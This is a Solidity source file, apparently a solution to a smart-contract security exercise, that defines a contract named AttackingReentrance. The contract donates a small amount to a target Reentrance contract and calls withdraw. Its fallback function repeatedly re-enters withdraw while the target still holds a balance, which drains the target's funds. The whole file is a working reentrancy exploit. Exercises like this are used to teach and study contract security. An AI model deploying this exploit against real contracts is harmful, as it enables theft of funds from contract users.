// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
interface IReentrance {
    function withdraw() external;
    function donate(address) external payable;
}
contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }
    fallback() external payable {
        if (address(contractAddress).balance >= 1) {
            IReentrance(contractAddress).withdraw();
        }
    }
    function hackContract() external {
        // Code me!
        IReentrance(contractAddress).donate{value: 1}(address(this));
        IReentrance(contractAddress).withdraw();
    
    }
}
